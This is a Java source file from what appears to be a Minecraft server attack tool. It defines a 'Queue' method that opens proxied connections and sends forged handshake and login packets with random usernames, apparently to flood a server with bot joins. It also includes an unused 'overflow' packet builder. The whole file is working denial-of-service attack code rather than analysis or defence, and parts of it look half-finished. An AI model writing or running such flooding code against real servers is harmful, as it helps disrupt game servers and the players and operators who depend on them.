package dev.xdmeow.core.methods.impl;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;
import java.awt.Color;

import dev.xdmeow.core.NettyBootstrap;
import dev.xdmeow.core.methods.IMethod;
import dev.xdmeow.core.util.helper.RandomUtils;
import dev.xdmeow.core.util.mcutil.PacketUtils;
import dev.xdmeow.core.util.proxy.Proxy;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Queue implements IMethod{

    @Override
    public void accept(Channel channel, Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bout = new ByteBufOutputStream(b);
        try {
            bout.write(15);
            bout.write(0);
            bout.write(47);
            bout.write(9);
            bout.writeBytes("localhost");
            bout.write(99);
            bout.write(223);
            bout.write(2);
            String lol = RandomUtils.randomString(6);
            bout.write(lol.length() + 2);
            bout.write(0);
            bout.write(lol.length());
            bout.writeBytes(lol);
            bout.close();
          } catch (IOException ioException) {
            ioException.printStackTrace();
          }
          channel.writeAndFlush(b);
          channel.writeAndFlush(bout);
          
          ++NettyBootstrap.currentConnections;
          ++NettyBootstrap.totalConnections;

    }
    
    public static byte[] createoverflowPacket() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        PacketUtils.writeVarInt(out, 0);
        Random randomGenerator = new Random();
        int red = randomGenerator.nextInt(256);
        int green = randomGenerator.nextInt(256);
        int blue = randomGenerator.nextInt(256);
        Color randomColour = new Color(red, green, blue);
        PacketUtils.writeString(out, "" + randomColour + randomColour);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
      }
      
}
